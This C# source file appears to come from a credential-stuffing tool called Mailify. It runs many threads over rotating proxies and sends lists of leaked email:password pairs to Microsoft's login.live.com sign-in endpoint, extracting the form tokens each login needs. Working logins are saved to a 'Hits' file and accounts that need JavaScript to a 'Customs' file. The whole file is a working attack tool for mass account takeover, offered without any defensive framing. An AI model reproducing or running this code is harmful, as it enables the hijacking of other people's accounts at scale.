using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace Mailify
{
    internal class Hotmail_2
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Mail_Mode_Title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();
            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                    req.IgnoreProtocolErrors = true;
                    req.AllowAutoRedirect = true;
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Accept", "*/*");
                    req.AddHeader("accept-encoding", "null");
                    string get = req.Get("https://login.live.com/login.srf").ToString();
                    string tok = Regex.Match(get, "https://login.live.com/login.srf?contextid=(.*?)&").Groups[1].Value;
                    string ctx = Regex.Match(get, "&bk=(.*?)&").Groups[1].Value;
                    string bk = Regex.Match(get, "&uaid=(.*?)\"/>").Groups[1].Value;
                    string uaid = Regex.Match(get, "&pid=(.*?)\"/>").Groups[1].Value;
                    string pid = Regex.Match(get, "&pid=(.*?)'").Groups[1].Value;
                    string ppft = Regex.Match(get, "name=\"PPFT\" id=\"i0327\" value=\"(.*?)\"/>'").Groups[1].Value;
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Accept", "*/*");
                    req.AddHeader("accept-encoding", "null");
                    string post = req.Post("https://login.live.com/ppsecure/post.srf?contextid=" + tok + "&bk=" + ctx + "&uaid=" + bk + "&pid=" + pid, "i13=0&login=" + credentials[0] + "&loginfmt=" + credentials[0] + "&type=11&LoginOptions=&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + credentials[1] + "&ps=&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=Passpor&NewUser=&FoundMSAs=&fspost=&i21=&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=0&i18=&i19=187165", "application/x-www-form-urlencoded").ToString();
                    if (post.Contains("Your account or password is incorrect."))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    if (post.Contains("That Microsoft account doesn\\\\'t exist."))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else if (post.Contains("name=\\\"t\\\" id=\\\"t\\\"") || post.Contains("type=\"hidden\" name=\"t\" id=\"t\" value=\""))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Hits.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (post.Contains("JavaScript required to sign in"))
                    {
                        Variables.Custom++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                        }

                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }


                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}